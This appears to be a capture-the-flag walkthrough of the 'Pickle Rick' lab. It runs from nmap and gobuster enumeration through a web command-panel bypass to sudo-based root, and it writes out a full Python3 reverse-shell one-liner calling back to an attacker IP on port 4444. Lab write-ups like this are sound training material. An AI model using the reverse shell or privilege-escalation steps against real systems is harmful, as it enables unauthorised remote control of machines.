## Target IP: `10.10.44.27`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.44.27 -oN results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

---

### Web Enumeration

Main page displays this message:

```
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

Page source includes:

```html
<!-- Note to self, remember username!
     Username: R1ckRul3s -->
```

---

### Directory Brute Force (Initial Attempt)

```bash
gobuster dir -u http://10.10.44.27 -w /usr/share/dirb/wordlists/common.txt
```

**Found:**

- `/robots.txt` → Contains `Wubbalubbadubdub`
- `/assets/` → Contains images, JS, and CSS files

---

### Downloading All Assets

```bash
wget -r -np -nH --cut-dirs=1 http://10.10.44.27/assets/
```

**Explanation:**

- `r`: Recursive
- `np`: No parent directories
- `nH`: Skip host directory
- `-cut-dirs=1`: Remove `/assets/` from path so files are saved directly

---

### Steganography Check

- Ran `steghide info` on `rickandmorty.jpeg` and `portal.jpg`
- Asked for passphrase
- Tried `binwalk` and `strings` on both → nothing useful

---

### Directory Brute Force (Second Attempt)

```bash
gobuster dir -u http://10.10.44.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip -o dirbust.txt
```

**Found:**

- `/login.php`

---

### Web Login

- Username: `R1ckRul3s`
- Password: `[REDACTED]`
- Successful login

---

### Portal Access

Options displayed:

- Commands
- Potions
- Creatures
- Beth Clone Notes

Used the "Command Panel" to interact.

---

### Command Panel Enumeration

```bash
whoami
# → www-data

ls
# → Sup3rS3cretPickl3Ingred.txt, assets, clue.txt, denied.php, index.html, login.php, portal.php, robots.txt
```

Tried `cat Sup3rS3cretPickl3Ingred.txt` → blocked

Tried:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

- Output: `[REDACTED]` ← First flag

---

### Clue File

```bash
less clue.txt
# → Look around the file system for the other ingredient.
```

---

### Reverse Shell

Checked Python version:

```bash
python3 --version
# → Python 3.8.10
```

Used reverse shell payload from [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
# This is for Python **2** and did NOT work
python -c 'import socket,subprocess,os; ... '
```

**Important mistake:**

This failed because it was for Python 2. Once `python3` was used instead, it worked.

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.6.24.56",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

---

### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### Second Flag

```bash
cd /home/rick
cat "second ingredients"
# → [REDACTED]
```

---

### Privilege Escalation

```bash
sudo -l
# → (ALL) ALL → Can run anything as root
```

Used:

```bash
sudo python3 -c 'import os; os.system("/bin/sh")

```

```bash
whoami
# → root
```

Retrieved third flag:

```bash
cat /root/3rd.txt
# → [REDACTED]
```

---

### Flags (Ingredients)

1. **[REDACTED]**
2. **[REDACTED]**
3. **[REDACTED]**
